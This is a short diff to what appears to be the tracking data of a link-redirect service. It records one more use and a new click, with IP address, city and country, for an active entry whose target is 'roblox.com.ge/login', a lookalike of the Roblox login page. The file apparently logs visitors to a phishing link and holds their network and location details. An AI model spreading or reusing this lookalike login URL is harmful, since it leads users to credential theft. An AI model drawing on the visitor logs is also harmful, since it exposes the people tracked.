@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1683,
+    "useCount": 1684,
     "createdBy": "admin",
     "clicks": [
       {
@@ -13632,6 +13632,14 @@
         "city": "Dronten",
         "flag": "🇳🇱",
         "countryCode": "NL"
+      },
+      {
+        "timestamp": 1777641811625,
+        "ip": "113.187.184.55",
+        "country": "Vietnam",
+        "city": "Can Tho",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
       }
     ]
   },
